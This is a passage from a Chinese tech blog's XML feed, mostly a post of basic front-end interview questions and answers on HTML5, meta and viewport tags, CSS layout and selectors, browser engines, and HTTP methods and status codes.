punctuation">[</span>         <span class="token punctuation">{</span>            <span class="token string">"total"</span> <span class="token punctuation">:</span> <span class="token number">284</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：此方法只能在3.4以上版本的数据库中使用，低版本的话还是做两次查询</p>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>300道基础面试题</title>
      <link href="2021/02/02/300%E9%81%93%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>2021/02/02/300%E9%81%93%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="HTML-篇"><a href="#HTML-篇" class="headerlink" title="HTML 篇"></a>HTML 篇</h2><h3 id="图片中-title-和-alt-区别？"><a href="#图片中-title-和-alt-区别？" class="headerlink" title="图片中 title 和 alt 区别？"></a>图片中 title 和 alt 区别？</h3><ul><li>通常当鼠标滑动到元素上的时候显示</li><li><code>alt</code> 是 <img src alt="img"> 的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。</li></ul><h3 id="Html5-有哪些新特性、移除了哪些元素"><a href="#Html5-有哪些新特性、移除了哪些元素" class="headerlink" title="Html5 有哪些新特性、移除了哪些元素"></a>Html5 有哪些新特性、移除了哪些元素</h3><ul><li>新增元素：<ul><li>绘画<code>canvas</code></li><li>用于媒介回放的<code>video 和 audio</code>元素</li><li>本地离线存储<code>localStorage</code>长期存储数据，浏览器关闭后数据不丢失</li><li><code>sessionStorage</code>的数据在浏览器关闭后自动删除</li><li>语义化更好的内容元素，比如 <code>article 、footer、header、nav、section</code></li><li>表单控件 ，<code>calendar 、 date 、 time 、 email 、 url 、 search</code></li><li>新的技术 <code>webworker 、 websocket 、 Geolocation</code></li></ul></li><li>移除的元素：<ul><li>纯表现的元素： <code>basefont 、 big 、 center 、 font 、 s 、 strike 、 tt 、 u</code></li><li>对可用性产生负面影响的元素： <code>frame 、 frameset 、 noframes</code></li></ul></li><li>支持 HTML5 新标签：<ul><li><code>IE8/IE7/IE6</code>支持通过 <code>document.createElement</code>方法产生的标签</li><li>可以利用这一特性让这些浏览器支持 <code>HTML5</code>新标签</li><li>浏览器支持新标签后，还需要添加标签默认的样式</li></ul></li></ul><h3 id="浏览器是怎么对-Html5-的离线储存资源进行管理和加载的呢"><a href="#浏览器是怎么对-Html5-的离线储存资源进行管理和加载的呢" class="headerlink" title="浏览器是怎么对 Html5 的离线储存资源进行管理和加载的呢"></a>浏览器是怎么对 Html5 的离线储存资源进行管理和加载的呢</h3><p>如何使用：</p><ul><li>页面头部像下面一样加入一个 <code>manifest</code> 的属性；</li><li>在 <code>cache.manifest</code> 文件的编写离线存储的资源</li><li>在离线状态时，操作 <code>window.applicationCache</code> 进行需求实现</li></ul><p>在线的情况下，浏览器发现<code>html</code>头部有 <code>manifest</code>属性，它会请求 <code>manifest</code>文件，如果是第一次访问 <code>app</code> ，那么浏览器就会根据<code>manifest</code>文件的内容下载相应的资源并且进行离线存储。如果已经访问过 <code>app</code> 并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的<code>manifest</code> 文件与旧的 <code>manifest</code> 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。</p><h3 id="iframe有那些缺点？"><a href="#iframe有那些缺点？" class="headerlink" title="iframe有那些缺点？"></a>iframe有那些缺点？</h3><ul><li><code>iframe</code>会阻塞主页面的 <code>Onload</code> 事件</li><li>搜索引擎的检索程序无法解读这种页面，<code>不利于 SEO</code></li><li><code>iframe</code> 和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载</li><li>使用 <code>iframe</code> 之前需要考虑这两个缺点。如果需要使用 <code>iframe</code>，最好是通过<code>javascript</code> 动态给 <code>iframe</code>添加 <code>src</code> 属性值，这样可以绕开以上两个问题</li></ul><h3 id="HTML-W3C的标准"><a href="#HTML-W3C的标准" class="headerlink" title="HTML W3C的标准"></a>HTML W3C的标准</h3><p>标签闭合、标签小写、不乱嵌套、使用外链 css 和 js 、结构行为表现的分离</p><h3 id="Doctype作用-严格模式与混杂模式如何区分？它们有何意义"><a href="#Doctype作用-严格模式与混杂模式如何区分？它们有何意义" class="headerlink" title="Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?"></a>Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h3><ul><li><code>&lt;!DOCTYPE&gt;</code>声明位于文档中的最前面，处于 <code>html</code> 标签之前。告知浏览器的解析器， 用什么文档类型、规范来解析这个文档</li><li>严格模式的排版和 <code>JS</code> 运作模式是 以该浏览器支持的最高标准运行</li><li>在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作<code>DOCTYPE</code> 不存在或格式不正确会导致文档以混杂模式呈现</li></ul><h3 id="HTML全局属性-global-attribute-有哪些"><a href="#HTML全局属性-global-attribute-有哪些" class="headerlink" title="HTML全局属性(global attribute)有哪些"></a>HTML全局属性(global attribute)有哪些</h3><ul><li><code>class</code> :为元素设置类标识</li><li><code>data-*</code>: 为元素增加自定义属性</li><li><code>draggable</code> : 设置元素是否可拖拽</li><li><code>id</code> : 元素 id ，文档内唯一</li><li><code>lang</code> : 元素内容的的语言</li><li><code>style</code>: 行内 css 样式</li><li><code>title</code> : 元素相关的建议信息</li></ul><h3 id="viewport的content属性作用"><a href="#viewport的content属性作用" class="headerlink" title="viewport的content属性作用"></a>viewport的content属性作用</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    width viewport的宽度[device-width | pixel_value]width如果直接设置pixel_value数值，大部分的安卓手机不支持，但是ios支持；    height – viewport 的高度 （范围从 223 到 10,000 ）    user-scalable [yes | no]是否允许缩放    initial-scale [数值] 初始化比例（范围从 > 0 到 10）    minimum-scale [数值] 允许缩放的最小比例    maximum-scale [数值] 允许缩放的最大比例    target-densitydpi 值有以下（一般推荐设置中等响度密度或者低像素密度，后者设置具体的值dpi_value，另外webkit内核已不准备再支持此属性）         -- dpi_value 一般是70-400//没英寸像素点的个数         -- device-dpi设备默认像素密度         -- high-dpi 高像素密度         -- medium-dpi 中等像素密度         -- low-dpi 低像素密度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>附带问题：怎样处理 移动端 1px 被 渲染成 2px 问题?</p><p>局部处理：</p><ul><li><code>mate</code> 标签中的 <code>viewport</code> 属性 ， <code>initial-scale</code> 设置为 1</li><li><code>rem</code> 按照设计稿标准走，外加利用<code>transfrome 的 scale(0.5)</code>缩小一倍即可；</li></ul><p>全局处理：</p><ul><li><code>mate</code>标签中的 <code>viewport</code> 属性 ， <code>initial-scale</code> 设置为 0.5</li><li><code>rem</code> 按照设计稿标准走即可</li></ul><h3 id="meta-相关"><a href="#meta-相关" class="headerlink" title="meta 相关"></a>meta 相关</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span> <span class="token comment" spellcheck="true">&lt;!--H5标准声明，使用 HTML5 doctype，不区分大小写--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span>”en”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--标准的 lang 属性写法--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span>’utf-8′</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--声明文档使用的字符编码--></span>&lt;meta http-equiv=”X-UA-Compatible” content=”IE=edge,chrome=1″/> <span class="token comment" spellcheck="true">&lt;!--优先使用指定浏览器使用特定的文档模式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”description”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”不超过150个字符”/</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--页面描述--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”keywords”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>””/</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 页面关键词--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”author”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”name,</span> <span class="token attr-name">email@gmail.com”</span><span class="token punctuation">/></span></span> <span class="token comment" spellcheck="true">&lt;!--网页作者--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”robots”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”index,follow”/</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--搜索引擎抓取--></span>&lt;meta name=”viewport” content=”initial-scale=1, maximum-scale=3, minimum-sc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”apple-mobile-web-app-title”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”标题”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--iOS 设备 begin--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”apple-mobile-web-app-capable”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”yes”/</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--添加到主屏后的标是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”apple-mobile-web-app-status-bar-style”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”black”/</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”renderer”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”webkit”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 启用360浏览器的极速模式(webkit)--></span>&lt;meta http-equiv=”X-UA-Compatible” content=”IE=edge”> <span class="token comment" spellcheck="true">&lt;!--避免IE使用兼容模式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span>”Cache-Control”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”no-siteapp”</span> <span class="token punctuation">/></span></span> <span class="token comment" spellcheck="true">&lt;!--不让百度转码--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”HandheldFriendly”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”true”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--针对手持设备优化，主要是针对一些老的不识别viewport的浏览器--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”MobileOptimized”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”320″</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--微软的老式浏览器--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”screen-orientation”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”portrait”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--uc强制竖屏--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”x5-orientation”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”portrait”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--QQ强制竖屏--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”full-screen”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”yes”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--UC强制全屏--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”x5-fullscreen”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”true”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--QQ强制全屏--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”browsermode”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”application”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--UC应用模式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”x5-page-mode”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”app”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- QQ应用模式--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>”msapplication-tap-highlight”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”no”</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--windows phone设置页面不缓存--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span>”pragma”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”no-cache”</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span>”cache-control”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”no-cache”</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span>”expires”</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span>”0″</span><span class="token punctuation">></span></span>复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/kongjiea/article/details/17092413" target="_blank" rel="noopener">了解更多参考：https://blog.csdn.net/kongjiea/article/details/17092413</a></p><h3 id="div-css的布局较table布局有什么优点"><a href="#div-css的布局较table布局有什么优点" class="headerlink" title="div+css的布局较table布局有什么优点"></a>div+css的布局较table布局有什么优点</h3><ul><li>改版的时候更方便 只要改 <code>css</code> 文件。</li><li>页面加载速度更快、结构化清晰、页面显示简洁。</li><li>表现与结构相分离。</li><li>易于优化<code>（ seo ）</code>搜索引擎更友好，排名更容易靠前。</li></ul><h3 id="src与href的区别"><a href="#src与href的区别" class="headerlink" title="src与href的区别"></a>src与href的区别</h3><ul><li><code>src</code> 用于替换当前元素，<code>href</code>用于在当前文档和引用资源之间确立联系。</li><li><code>src</code>是 <code>source</code>的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求<code>src</code>资源时会将其指向的资源下载并应用到文档内，例如 <code>js</code>脚本，<code>img</code> 图片和 <code>frame</code> 等元素</li></ul><blockquote><p> 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部</p></blockquote><p>- <code>href 是 Hypertext Reference</code>的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加 - <code>link href=&quot;common.css&quot; rel=&quot;stylesheet&quot;</code> 那么浏览器会识别该文档为 <code>css</code>文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 <code>link</code> 方式来加载 <code>css</code>，而不是使用 <code>@import</code> 方式</p><h2 id="CSS-篇"><a href="#CSS-篇" class="headerlink" title="CSS 篇"></a>CSS 篇</h2><h3 id="link-与-import-的区别"><a href="#link-与-import-的区别" class="headerlink" title="link 与 @import 的区别"></a>link 与 @import 的区别</h3><ul><li><code>link</code> 是 <code>HTML</code> 方式， <code>@import</code> 是<code>CSS</code>方式</li><li><code>link</code> 最大限度支持并行下载， <code>@import</code> 过多嵌套导致串行下载，出现 FOUC (文档样式短暂失效)</li><li><code>link</code>可以通过 <code>rel=&quot;alternate stylesheet&quot;</code>指定候选样式</li><li>浏览器对 <code>link</code>支持早于 <code>@import</code> ，可以使用 <code>@import</code> 对老浏览器隐藏样式</li><li><code>@import</code> 必须在样式规则之前，可以在<code>css</code>文件中引用其他文件</li><li>总体来说： <code>link</code> 优于 <code>@import</code> ，<code>link</code>优先级也更高</li></ul><h3 id="BFC-有什么用"><a href="#BFC-有什么用" class="headerlink" title="BFC 有什么用"></a>BFC 有什么用</h3><ul><li>创建规则：<ul><li>根元素</li><li>浮动元素（ <code>float</code> 不取值为<code>none</code> ）</li><li>绝对定位元素（ <code>position</code>取值为 <code>absolute</code> 或 <code>fixed</code> ）</li><li><code>display</code> 取值为 <code>inline-block 、 table-cell 、 table-caption 、 flex 、inline-flex</code>之一的元素</li><li><code>overflow</code> 不取值为 <code>visible</code>的元素</li></ul></li><li>作用<ul><li>可以包含浮动元素</li><li>不被浮动元素覆盖</li><li>阻止父子元素的 <code>margin</code> 折叠</li></ul></li></ul><h3 id="清除浮动的几种方式"><a href="#清除浮动的几种方式" class="headerlink" title="清除浮动的几种方式"></a>清除浮动的几种方式</h3><ul><li>父级 <code>div</code> 定义 <code>height</code></li><li>结尾处加空 <code>div</code> 标签<code>clear:both</code></li><li>父级 <code>div</code> 定义伪类 <code>:after</code> 和 <code>zoom</code></li><li>父级 <code>div</code> 定义 <code>overflow:hidden</code></li><li>父级 <code>div</code> 也浮动，需要定义宽度</li><li>结尾处加 <code>br</code> 标签 <code>clear:both</code></li></ul><h3 id="Css3-新增伪类-伪元素"><a href="#Css3-新增伪类-伪元素" class="headerlink" title="Css3 新增伪类 - 伪元素"></a>Css3 新增伪类 - 伪元素</h3><ul><li><code>p:first-of-type</code>选择属于其父元素的首个 <p> 元素的每个 </p><p> 元素。</p></li><li><code>p:last-of-type</code>选择属于其父元素的最后 <p> 元素的每个 </p><p> 元素。</p></li><li><code>p:only-of-type</code>选择属于其父元素唯一的 <p> 元素的每个 </p><p> 元素。</p></li><li><code>p:only-child</code>选择属于其父元素的唯一子元素的每个 <p> 元素。</p></li><li><code>p:nth-child(2)</code>选择属于其父元素的第二个子元素的每个 <p> 元素。</p></li><li><code>:enabled</code>已启用的表单元素。</li><li><code>:disabled</code>已禁用的表单元素。</li><li><code>:checked</code>单选框或复选框被选中。</li><li><code>::before</code>在元素之前添加内容。</li><li><code>::after</code>在元素之后添加内容,也可以用来做清除浮动。</li><li><code>::first-line</code>添加一个特殊的样式到文本的首字母。</li><li><code>::first-letter</code>添加一行特殊样式到首行。</li></ul><p>相信大家也看出来他们的不同，</p><ul><li>伪类语法一个：，它是为了弥补css常规类选择器的不足</li><li>伪元素语法两个：，它是凭空创建的一个虚拟容器生成的元素</li></ul><h3 id="IE盒子模型-、W3C盒子模型"><a href="#IE盒子模型-、W3C盒子模型" class="headerlink" title="IE盒子模型 、W3C盒子模型"></a>IE盒子模型 、W3C盒子模型</h3><ul><li>W3C盒模型： 内容(content)、填充( padding )、边界( margin )、 边框( border )；<ul><li><code>box-sizing: content-box</code></li><li>width = content width;</li></ul></li><li>IE盒子模型： IE 的content 部分把 border 和 padding 计算了进去;<ul><li><code>box-sizing: border-box</code></li><li>width = border + padding + content width</li></ul></li></ul><h3 id="display-inline-block-什么时候不会显示间隙？"><a href="#display-inline-block-什么时候不会显示间隙？" class="headerlink" title="display:inline-block 什么时候不会显示间隙？"></a>display:inline-block 什么时候不会显示间隙？</h3><ul><li>移除空格</li><li>使用<code>margin</code> 负值</li><li>使用 <code>font-size:0</code></li><li><code>letter-spacing</code></li><li><code>word-spacing</code></li></ul><h3 id="行内元素float-left后是否变为块级元素？"><a href="#行内元素float-left后是否变为块级元素？" class="headerlink" title="行内元素float:left后是否变为块级元素？"></a>行内元素float:left后是否变为块级元素？</h3><p>行内元素设置成浮动之后变得更加像是 <code>inline-block</code>（行内块级元素，设置 成这个属性的元素会同时拥有行内和块级的特性，最明显的不同是它的默认宽度不是 100% ），这时候给行内元素设置 <code>padding-top</code> 和 <code>padding-bottom</code>或者<code>width 、 height</code>都是有效果的</p><h3 id="如果需要手动写动画，你认为最小时间间隔是多久，为什么？"><a href="#如果需要手动写动画，你认为最小时间间隔是多久，为什么？" class="headerlink" title="如果需要手动写动画，你认为最小时间间隔是多久，为什么？"></a>如果需要手动写动画，你认为最小时间间隔是多久，为什么？</h3><p>多数显示器默认频率是 60Hz ，即 1 秒刷新 60 次，所以理论上最小间隔为 1/60*1000ms ＝ 16.7ms</p><h3 id="CSS不同选择器的权重-CSS层叠的规则"><a href="#CSS不同选择器的权重-CSS层叠的规则" class="headerlink" title="CSS不同选择器的权重(CSS层叠的规则)"></a>CSS不同选择器的权重(CSS层叠的规则)</h3><ul><li><code>！important</code>规则最重要，大于其它规则</li><li>行内样式规则，加 1000</li><li>对于选择器中给定的各个 ID 属性值，加 100</li><li>对于选择器中给定的各个类属性、属性选择器或者伪类选择器，加 10</li><li>对于选择其中给定的各个元素标签选择器，加1</li><li>如果权值一样，则按照样式规则的先后顺序来应用，顺序靠后的覆盖靠前的规则</li></ul><h3 id="stylus-sass-less区别"><a href="#stylus-sass-less区别" class="headerlink" title="stylus/sass/less区别"></a>stylus/sass/less区别</h3><ul><li>均具有“变量”、“混合”、“嵌套”、“继承”、“颜色混合”五大基本特性</li><li><code>Sass</code> 和 <code>LESS</code> 语法较为严谨， <code>LESS</code> 要求一定要使用大括号“{}”， <code>Sass</code> 和 <code>Stylus</code> 可以通过缩进表示层次与嵌套关系</li><li><code>Sass</code> 无全局变量的概念， <code>LESS</code> 和 <code>Stylus</code>有类似于其它语言的作用域概念</li><li><code>Sass</code> 是基于 <code>Ruby</code> 语言的，而 <code>LESS</code>和 <code>Stylus</code>可以基于 <code>NodeJS NPM</code> 下载相应库后进行编译；这也是为什么安装Sass的时候有时候会报错，需要安装python脚本</li></ul><p>优点：就不用我多说了，谁用谁知道，真香。</p><h3 id="rgba-和opacity的透明效果有什么不同？"><a href="#rgba-和opacity的透明效果有什么不同？" class="headerlink" title="rgba()和opacity的透明效果有什么不同？"></a>rgba()和opacity的透明效果有什么不同？</h3><ul><li><code>rgba()</code> 和 <code>opacity</code> 都能实现透明效果，但最大的不同是 <code>opacity</code> 作用于元素，以及元素内的所有内容的透明度，</li><li>而 <code>rgba()</code> 只作用于元素的颜色或其背景色。（设置 rgba 透明的元素的子元素不会继承透明效果！）</li></ul><h3 id="水平居中的方法"><a href="#水平居中的方法" class="headerlink" title="水平居中的方法"></a>水平居中的方法</h3><ul><li>元素为行内元素，设置父元素 <code>text-align:center</code></li><li>如果元素宽度固定，可以设置左右 <code>margin 为 auto</code>;</li><li>如果元素为绝对定位，设置父元素 <code>position 为 relative</code>，元素设<code>left:0;right:0;margin:auto;</code></li><li>使用 <code>flex-box</code> 布局，指定 <code>justify-content</code> 属性为<code>center</code></li><li><code>display</code> 设置为 <code>tabel-ceil</code></li></ul><h3 id="垂直居中的方法"><a href="#垂直居中的方法" class="headerlink" title="垂直居中的方法"></a>垂直居中的方法</h3><ul><li>将显示方式设置为表格， <code>display:table-cell</code> ,同时设置 <code>vertial-align：middle</code></li><li>使用 <code>flex</code> 布局，设置为 <code>align-item：center</code></li><li>绝对定位中设置 <code>bottom:0,top:0</code>,并设置 <code>margin:auto</code></li><li>绝对定位中固定高度时设置<code>top:50%，margin-top</code>值为高度一半的负值</li><li>文本垂直居中设置 <code>line-height</code> 为 <code>height</code>值</li></ul><h2 id="浏览器-篇"><a href="#浏览器-篇" class="headerlink" title="浏览器 篇"></a>浏览器 篇</h2><h3 id="浏览器内核的理解"><a href="#浏览器内核的理解" class="headerlink" title="浏览器内核的理解"></a>浏览器内核的理解</h3><ul><li>主要分两个部分：<code>渲染引擎</code>、<code>js引擎</code></li><li><code>渲染引擎：</code>负责取得网页的内容（html css img …），以及计算网页的显示方式，然后会输出至显示器或者打印机。浏览器的内核不同对于网页的语法解释也不同，所以渲染的效果也不一样</li><li><code>js引擎：</code>解析和执行javascript 来实现网页的动态效果</li><li>最开始渲染引擎和js引擎并没有区分的很明确，后来js引擎越来越独立，内核就倾向于只值渲染引擎</li><li><code>IE : trident</code> 内核</li><li><code>Firefox ： gecko</code> 内核</li><li><code>Safari : webkit</code> 内核</li><li><code>Opera</code> :以前是 <code>presto</code> 内核， <code>Opera</code> 现已改用<code>Google - Chrome</code> 的 <code>Blink</code> 内核</li><li><code>Chrome:Blink</code>(基于 <code>webkit</code> ，<code>Google与Opera Software</code>共同开发)</li></ul><h3 id="HTTP-请求-作用？"><a href="#HTTP-请求-作用？" class="headerlink" title="HTTP 请求+作用？"></a>HTTP 请求+作用？</h3><ul><li><code>Get</code> 方法：发送一个请求来获取服务器资源</li><li><code>POST</code> 方法：向服务器提交数据</li><li><code>PUT</code> 方法：与<code>POST</code>方法很像，也是提交数据，但<code>PUT</code>制定了资源在服务器上的位置，常用在修改数据</li><li><code>HEAD</code> 方法：只请求页面的首部信息</li><li><code>DELETE</code> 方法：删除服务器上的资源</li><li><code>OPTIONS</code> 方法：用于获取当前<code>URL</code>支持的请求方式</li><li><code>TRACE</code>方法：用于激活一个远程的应用层请求消息回路</li><li><code>CONNECT</code> 方法：把请求链接转换到透明的<code>TCP/IP</code>的通道</li></ul><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><ul><li><pre><code>1XX</code></pre><p> ：信息状态码</p><ul><li><code>100 continue</code> 继续，一般在发送 post 请求时，已发送了 http header 之后服务端将返回此信息，表示确认，之后发送具体参数信息</li></ul></li><li><pre><code>2XX</code></pre><p> ：成功状态码</p><ul><li><code>200 ok</code>正常返回信息</li><li><code>201 created</code> 请求成功并且服务器创建了新资源</li><li><code>202 accepted</code>服务器已经接收请求，但尚未处理</li></ul></li><li><pre><code>3XX</code></pre><p> ：重定向</p><ul><li><code>301 move per</code>请求的网页已经永久重定向</li><li><code>302 found</code>临时重定向</li><li><code>303 see other</code>临时冲重定向，且总是使用get请求新的url</li><li><code>304 not modified</code> 自从上次请求后，请求的网页未修改过</li></ul></li><li><pre><code>4XX</code></pre><p> ：客户端错误</p><ul><li><code>400 bad request</code> 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求</li><li><code>401 unauthorized</code> 请求未授权</li><li><code>403 forbidden</code>禁止访问</li></ul></li><li><p><code>404 not found</code> 找不到如何与url匹配的资源</p></li><li><pre><code>5XX</code></pre><p> ：服务器错误</p><ul><li><code>500 internal server error</code>最常见的服务器端的错误</li><li><code>503 service unacailable</code>服务器端暂时无法处理请求（可能是过载活维护）</li></ul></li></ul><h3 id="从浏览器地址栏输入URL后发生了什么？"><a href="#从浏览器地址栏输入URL后发生了什么？" class="headerlink" title="从浏览器地址栏输入URL后发生了什么？"></a>从浏览器地址栏输入URL后发生了什么？</h3><h4 